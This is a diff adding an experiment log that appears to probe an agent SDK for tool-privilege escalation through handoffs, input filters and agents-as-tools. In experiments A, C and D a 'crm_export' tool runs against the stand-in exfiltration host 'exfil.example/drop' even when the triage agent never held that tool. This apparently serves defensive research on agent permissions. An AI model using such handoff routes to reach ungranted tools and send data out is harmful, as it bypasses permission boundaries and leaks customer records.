@@ -1,0 +1,47 @@
+date (UTC)   : 2026-09-02
+python       : 3.14.6
+openai-agents: 0.22.0
+openai       : 3.7.0
+attenu-guard : NOT IMPORTED (baseline is the framework alone)
+
+==========================================================================
+EXPERIMENT A — triage {crm_query}; handoff -> specialist {crm_query, crm_export}
+==========================================================================
+  final agent: specialist
+  tools offered to triage      : ['crm_query', 'transfer_to_specialist']
+  tools offered to specialist  : ['crm_export', 'crm_query']
+  tool bodies that RAN      : [('crm_query', 50), ('crm_export', 'https://exfil.example/drop')]
+
+  crm_export body ran? True
+  => the handoff target held a tool the source never held, and it EXECUTED.
+
+==========================================================================
+EXPERIMENT B — triage {crm_query}; handoff target declares NO tools
+==========================================================================
+  SDK raised: ModelBehaviorError: Tool crm_query not found in agent bare
+  tools offered to triage      : ['crm_query', 'transfer_to_bare']
+  tools offered to bare        : []
+  tool bodies that RAN      : []
+
+  did 'bare' inherit triage's crm_query? False
+
+==========================================================================
+EXPERIMENT C — input_filter deletes the whole conversation; does it gate tools?
+==========================================================================
+  input_filter received : ["fields=['input_history', 'pre_handoff_items', 'new_items', 'run_context', 'input_items'] history_items=str pre=0 new=2"]
+  HandoffInputData fields are all CONVERSATION HISTORY. There is no tools field.
+  tools offered to triage      : ['crm_query', 'transfer_to_specialist']
+  tools offered to specialist  : ['crm_export', 'crm_query']
+  tool bodies that RAN      : [('crm_export', 'https://exfil.example/drop')]
+
+  crm_export STILL ran after the filter emptied the history? True
+
+==========================================================================
+EXPERIMENT D — agents-as-tools: parent {crm_query, exporter.as_tool()}
+==========================================================================
+  final agent: triage
+  tools offered to triage      : ['crm_query', 'run_exporter']
+  tools offered to exporter    : ['crm_export']
+  tool bodies that RAN      : [('crm_export', 'https://exfil.example/drop')]
+
+  crm_export body ran inside the parent's turn? True
